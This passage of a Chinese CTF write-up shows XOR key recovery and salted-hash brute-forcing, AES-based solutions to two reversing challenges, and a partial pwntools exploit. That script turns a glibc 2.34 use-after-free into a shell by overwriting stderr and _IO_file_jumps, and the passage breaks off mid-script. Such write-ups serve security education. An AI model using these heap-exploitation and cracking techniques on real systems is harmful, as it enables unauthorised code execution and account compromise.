data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444984/Typera/2023/04/fe48ad2860db212c649751149211d71d.png\" alt=\"\" /></p>\n<p>可见能看到明文信息，从最后一串下手，可以猜出是 e  were neither up nor down. OK ，根据明文与密文异或求出 key。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s=<span class=\"built_in\">bytes</span>.fromhex(<span class=\"string\">&#x27;32397f47102d3c101b3a2a34063a2013354111173036600a0c44314c602d32&#x27;</span>)</span><br><span class=\"line\">txt=<span class=\"string\">&quot;e  were neither up nor down. OK&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(s)):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(txt[i])^s[i]),end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#W_0u_Y0u_C@n_R3@11y_D@nc3_b@by</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(<span class=\"string\">&#x27;25&#x27;</span>,<span class=\"number\">16</span>)^<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;e&#x27;</span>)))</span><br><span class=\"line\"><span class=\"comment\">#W@_0u_Y0u_C@n_R3@11y_D@nc3_b@by</span></span><br></pre></td></tr></table></figure></p>\n<p>还有一位没有还原，可以结合第一句话是倒数第四句话 they 来推测，拿到正确的 key，之后 key 与所有密文异或。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/ff1f317976f4a27903d448b1ab4c8a29.png\" alt=\"image-20220619211840330\" /></p>\n<p>还原出的 key 作为压缩包解密，第二关给了一个字典和一个加 salt 的 hash，hash 无法逆求所以只能是爆破将字典的字符按照对应的 salt 依次爆破。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> passlib.<span class=\"built_in\">hash</span> <span class=\"keyword\">import</span> md5_crypt</span><br><span class=\"line\">f=<span class=\"built_in\">open</span>(<span class=\"string\">r&#x27;C:\\Users\\lx\\Desktop\\分区赛\\密码\\minirockyou.txt&#x27;</span>,<span class=\"string\">&#x27;r&#x27;</span>)</span><br><span class=\"line\">enc=<span class=\"string\">&#x27;$1$ciscn010$mSuTlV75nZZGGjoayF/nS0&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    s=f.readline().replace(<span class=\"string\">&#x27;\\n&#x27;</span>,<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> enc <span class=\"keyword\">in</span> md5_crypt.<span class=\"built_in\">hash</span>(s,salt=<span class=\"string\">&#x27;ciscn010&#x27;</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(s)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure></p>\n<p>因为密码数据比较短，所以依次手动修改 enc 和 salt 即可，最终得到一串明文字符。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">m=<span class=\"string\">&quot;the second letter of each word in this list in order&quot;</span> <span class=\"comment\">#取出这些单词的第二个字符</span></span><br><span class=\"line\">m=m.split(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">str</span>=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(m)):</span><br><span class=\"line\">    <span class=\"built_in\">str</span>+=m[i][<span class=\"number\">1</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">str</span>)</span><br><span class=\"line\"><span class=\"comment\">#heefaonhinr</span></span><br><span class=\"line\"><span class=\"comment\">#flag&#123;0ed7bc5c61e32c10e082abd2b5589a22&#125;</span></span><br></pre></td></tr></table></figure></p>\n<p>直接将得到的字符包上 flag 提交不对，长度不对，其余 flag 的内容均为 32 位 16 进制，所以尝试 flag {md5 (heefaonhinr)}，: ) 提交正确。</p>\n<h2 id=\"re\"><a class=\"anchor\" href=\"#re\">#</a> RE</h2>\n<h3 id=\"crackme2\"><a class=\"anchor\" href=\"#crackme2\">#</a> crackme2</h3>\n<p 50c418de67942e713517e900dbd12183=\"\"><code>flag</code> : flag</p>\n<p>android 逆向，jadx 打开，查看 main1Activity，其中主要函数如下<br />\n <figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">native</span> String <span class=\"title function_\">stringFromJNI</span><span class=\"params\">(String str)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">    System.loadLibrary(<span class=\"string\">&quot;crackme2&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"type\">boolean</span> <span class=\"title function_\">checkFmt</span><span class=\"params\">(String input)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; input.length(); i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (Character.isUpperCase(input.charAt(i))) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"comment\">/* synthetic */</span> <span class=\"keyword\">void</span> m0lambda$onCreate$<span class=\"number\">0</span>$comctfcrackme2Main1Activity(EditText et_input, View v) &#123;</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">input</span> <span class=\"operator\">=</span> et_input.getText().toString();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (input.startsWith(<span class=\"string\">&quot;flag&#123;&quot;</span>) &amp;&amp; input.endsWith(<span class=\"string\">&quot;&#125;&quot;</span>) &amp;&amp; input.length() &gt; <span class=\"number\">6</span> &amp;&amp; input.length() &lt; <span class=\"number\">39</span> &amp;&amp; checkFmt(input)) &#123;</span><br><span class=\"line\">        Toast.makeText(<span class=\"built_in\">this</span>, stringFromJNI(input.substring(<span class=\"number\">5</span>, input.length() - <span class=\"number\">1</span>)), <span class=\"number\">0</span>).show();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br />\n 首先 check 了 flag 的格式和长度，checkFmt 用于确定输入无大写，之后调用了 stringFromJNI 即 native 层函数，故主要逻辑在 so 文件，先解压 apk，ida 加载 x86 的 so 文件，首先查看导出表，发现该函数是静态注册的，修改一下参数如下。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/35f672f500d43444bd5231a0a8c258b7.png\" alt=\"image-20220619201210787\" /></p>\n<p>首先判断传入内容是否为 32 位，之后跟进 sub_D1FE5640 函数对 flag 的内容进行 check。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/106131f536b262650aa3b590534a0514.png\" alt=\"image-20220619201406417\" /></p>\n<p>这一步是读取序列化文件 tmp，用于之后加密使用，紧接着通过 sscanf 将输入两个一组转为 16 进制存入一个数组，32 为输入为仅为 16 进制的字符。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444984/Typera/2023/04/04108af78a95bd369ca3ba2f1a87376d.png\" alt=\"image-20220619201917396\" /></p>\n<p>之后是调用了 <code>com/risid/test/AESEncrypt</code>  对象中的 encrypt 方法，并且通过 <code>SetByteArrayRegion</code>  函数实现 JNI 向 java 层传参数，jadx 中可以找到 encrypt 方法的定义。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/cbb3b62057a98ec580c35b63d77d89f9.png\" alt=\"image-20220619202135278\" /></p>\n<p>JNI 传给该函数的参数 content 是 sscanf 后存入的数组，iv 则是 &quot;0123456789abcdef&quot;，第三个参数则是从 tmp 中解析的对象，可见上述操作主要实现了 AES 的 CBC 加密，主要解密密文的前 16 个字节，已经拿到了 iv 还缺少 key。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444984/Typera/2023/04/2cb8a1e069fa00e3c92f1926f902ca6e.png\" alt=\"image-20220619203245330\" /></p>\n<p>key 可以在 <code>com/risid/test</code>  包中的 <code>AESGenerator</code>  类中找到，用 python 尝试解密即可。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\">c=<span class=\"built_in\">bytes</span>([<span class=\"number\">0x08</span>, <span class=\"number\">0x32</span>, <span class=\"number\">0x97</span>, <span class=\"number\">0x4C</span>, <span class=\"number\">0x9E</span>, <span class=\"number\">0xE2</span>, <span class=\"number\">0xDB</span>, <span class=\"number\">0x44</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x92</span>, <span class=\"number\">0x0B</span>, <span class=\"number\">0x0F</span>, <span class=\"number\">0x7C</span>, <span class=\"number\">0x75</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x56</span>, <span class=\"number\">0x7C</span>, <span class=\"number\">0x13</span>, <span class=\"number\">0xA3</span>, <span class=\"number\">0xBF</span>, <span class=\"number\">0xB4</span>, <span class=\"number\">0x69</span>, <span class=\"number\">0x5D</span>, <span class=\"number\">0x88</span>, <span class=\"number\">0xCE</span>, <span class=\"number\">0x0B</span>, <span class=\"number\">0x97</span>, <span class=\"number\">0x78</span>, <span class=\"number\">0x51</span>, <span class=\"number\">0x05</span>, <span class=\"number\">0x8A</span>, <span class=\"number\">0xD9</span>])</span><br><span class=\"line\">iv=<span class=\"string\">b&#x27;0123456789abcdef&#x27;</span></span><br><span class=\"line\">key=<span class=\"built_in\">bytes</span>.fromhex(<span class=\"string\">&#x27;60aef077a3624ff7725b77dae4c6e004&#x27;</span>)</span><br><span class=\"line\">aes=AES.new(key,AES.MODE_CBC,iv)</span><br><span class=\"line\">m=aes.decrypt(c)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">16</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(m[i])[<span class=\"number\">2</span>:].zfill(<span class=\"number\">2</span>),end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#flag&#123;50c418de67942e713517e900dbd12183&#125;</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"easycry\"><a class=\"anchor\" href=\"#easycry\">#</a> easycry</h3>\n<p>re 签到题，exeinfo 查壳，64 位无壳 elf 文件，ida64 载入。</p>\n<p 061cc4091400c082234a57034ed05cf2=\"\"><code>flag</code> ：flag</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/c61d07c934a61164fc0d92c28ff9d3ad.png\" alt=\"image-20220619204320327\" /></p>\n<p>findcrypt 插件搜索，发现 AES 的 sbox，并且 main 函数逻辑比较清晰。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/f8cec6059657af8083a6574724aef7e0.png\" alt=\"image-20220619204531962\" /></p>\n<p>v5 是 AES 秘钥，ptr 是扩展秘钥，秘钥是 32 位，sub_1DC5 是秘钥扩展，sub_2181 则是分两个 16 字节进行加密，AES ECB 模式，直接解密即可拿到 flag。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\">k=<span class=\"built_in\">bytes</span>([<span class=\"number\">0x00</span>, <span class=\"number\">0x01</span>, <span class=\"number\">0x02</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0x04</span>, <span class=\"number\">0x05</span>, <span class=\"number\">0x06</span>, <span class=\"number\">0x07</span>, <span class=\"number\">0x08</span>, <span class=\"number\">0x09</span>, <span class=\"number\">0x0A</span>, <span class=\"number\">0x0B</span>, <span class=\"number\">0x0C</span>, <span class=\"number\">0x0D</span>, <span class=\"number\">0x0E</span>, <span class=\"number\">0x0F</span>, <span class=\"number\">0x10</span>, <span class=\"number\">0x11</span>, <span class=\"number\">0x12</span>, <span class=\"number\">0x13</span>, <span class=\"number\">0x14</span>, <span class=\"number\">0x15</span>, <span class=\"number\">0x16</span>, <span class=\"number\">0x17</span>, <span class=\"number\">0x18</span>, <span class=\"number\">0x19</span>, <span class=\"number\">0x1A</span>, <span class=\"number\">0x1B</span>, <span class=\"number\">0x1C</span>, <span class=\"number\">0x1D</span>, <span class=\"number\">0x1E</span>, <span class=\"number\">0x1F</span>])</span><br><span class=\"line\">aes=AES.new(k,AES.MODE_ECB)</span><br><span class=\"line\">c=<span class=\"built_in\">bytes</span>([<span class=\"number\">0x32</span>, <span class=\"number\">0x59</span>, <span class=\"number\">0x1D</span>, <span class=\"number\">0xED</span>, <span class=\"number\">0xBA</span>, <span class=\"number\">0xAC</span>, <span class=\"number\">0x5D</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0xCE</span>, <span class=\"number\">0x1E</span>, <span class=\"number\">0xBD</span>, <span class=\"number\">0x8C</span>, <span class=\"number\">0x43</span>, <span class=\"number\">0xFA</span>, <span class=\"number\">0x34</span>, <span class=\"number\">0x5B</span>, <span class=\"number\">0x9D</span>, <span class=\"number\">0x6E</span>, <span class=\"number\">0xBB</span>, <span class=\"number\">0x25</span>, <span class=\"number\">0xF9</span>, <span class=\"number\">0x17</span>, <span class=\"number\">0x59</span>, <span class=\"number\">0x31</span>, <span class=\"number\">0xDE</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x36</span>, <span class=\"number\">0xB9</span>, <span class=\"number\">0x5B</span>, <span class=\"number\">0xB5</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0x5B</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(aes.decrypt(c))</span><br><span class=\"line\"><span class=\"comment\">#flag&#123;061cc4091400c082234a57034ed05cf2&#125;</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> PWN</h2>\n<h3 id=\"duck\"><a class=\"anchor\" href=\"#duck\">#</a> duck</h3>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444986/Typera/2023/04/b330caffb4d582c144c2e06d22eb3057.png\" alt=\"image-20220619194732802\" /></p>\n<p><strong>flag{693edf4763ef4cdd4f152794028b7f5e}</strong></p>\n<p>libc 2.34 下的 pwn 题，给的漏洞比较基础就是 <strong>UAF</strong>，同时给了 Edit 功能，我们可以很简单的 getshell。</p>\n<p><strong>思路</strong></p>\n<ol>\n<li>利用 UAF leak 堆地址，分配并 Dele 掉多个堆块 leak libc</li>\n<li>分配 chunk 到 Tcache 的 entry 处，利用 Edit 函数我们可以控制任意分配堆块</li>\n<li>修改掉 stderr 的 flag 为  <code>/bin/sh\\0</code></li>\n<li>修改掉  <code>_IO_file_jumps</code>  里的函数指针为  <code>system</code>  ，最后改掉 Top Chunk 的 size 进入  <code>_IO_fflush</code>  触发 getshell。</li>\n</ol>\n<p><strong>Exp</strong></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python2</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">se      = <span class=\"keyword\">lambda</span> data               :p.send(data) </span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class=\"line\">sea     = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">rc      = <span class=\"keyword\">lambda</span> numb=<span class=\"number\">4096</span>          :p.recv(numb)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">lg = <span class=\"keyword\">lambda</span> name,data : p.success(name + <span class=\"string\">&#x27;: \\033[1;36m 0x%x \\033[0m&#x27;</span> % data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\"><span class=\"built_in\">breakpoint</span>=<span class=\"string\">&#x27;&#x27;</span></span>):</span><br><span class=\"line\">    glibc_dir = <span class=\"string\">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span></span><br><span class=\"line\">    gdbscript = <span class=\"string\">&#x27;directory %smalloc/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %sstdio-common/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %sstdlib/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %slibio/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    elf_base = <span class=\"built_in\">int</span>(os.popen(<span class=\"string\">&#x27;pmap &#123;&#125;| awk \\x27&#123;&#123;print \\x241&#125;&#125;\\x27&#x27;</span>.<span class=\"built_in\">format</span>(p.pid)).readlines()[<span class=\"number\">1</span>], <span class=\"number\">16</span>) <span class=\"keyword\">if</span> elf.pie <span class=\"keyword\">else</span> <span class=\"number\">0</span></span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;b *&#123;:#x&#125;\\n&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">int</span>(<span class=\"built_in\">breakpoint</span>) + elf_base) <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(<span class=\"built_in\">breakpoint</span>, <span class=\"built_in\">int</span>) <span class=\"keyword\">else</span> <span class=\"built_in\">breakpoint</span></span><br><span class=\"line\">    gdb.attach(p, gdbscript)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">context(arch = elf.arch, os = <span class=\"string\">&#x27;linux&#x27;</span>,log_level = <span class=\"string\">&#x27;debug&#x27;</span>,terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-hp&#x27;</span>,<span class=\"string\">&#x27;62&#x27;</span>])</span><br><span class=\"line\"><span class=\"comment\"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;192.168.166.147&#x27;</span>,<span class=\"number\">58013</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">menu</span>(<span class=\"params\">c</span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Choice: &#x27;</span>,<span class=\"built_in\">str</span>(c))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>():</span><br><span class=\"line\">    menu(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dele</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">2</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Idx: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">3</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Idx: \\n&#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\"><span class=\"built_in\">id</span>,data,size=<span class=\"number\">0x100</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">4</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Idx: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Size: &#x27;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    sea(<span class=\"string\">&#x27;Content: &#x27;</span>,<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add()</span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">heap_leak = uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>))</span><br><span class=\"line\">heap_base = heap_leak &lt;&lt;<span class=\"number\">12</span></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;heap_leak&#x27;</span>,heap_leak)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">    add() <span class=\"comment\"># 9</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">2</span>+<span class=\"number\">8</span>):</span><br><span class=\"line\">    dele(i)</span><br><span class=\"line\">show(<span class=\"number\">8</span>)</span><br><span class=\"line\">libc_leak = uu64(ru(<span class=\"string\">&#x27;\\x7f&#x27;</span>,drop=<span class=\"literal\">False</span>)[-<span class=\"number\">6</span>:])</span><br><span class=\"line\">libc_base = libc_leak - <span class=\"number\">0x1f2cc0</span></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_leak&#x27;</span>,libc_leak)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\">libc.address = libc_base</span><br><span class=\"line\">system_addr = libc.sym.system</span><br><span class=\"line\">bin_sh = libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).<span class=\"built_in\">next</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">stderr = libc_base + <span class=\"number\">0x1f3680</span></span><br><span class=\"line\">helper = libc_base + <span class=\"number\">0x1f45c0</span></span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">7</span>,p64(heap_leak^(heap_base+<span class=\"number\">0x100</span>)))</span><br><span class=\"line\">add() <span class=\"comment\"># 11</span></span><br><span class=\"line\"><span class=\"comment\"># pause()</span></span><br><span class=\"line\">add() <span class=\"comment\"># 12</span></span><br><span class=\"line\">edit(<span class=\"number\">12</span>,p64(stderr)*<span class=\"number\">2</span>)</span><br><span 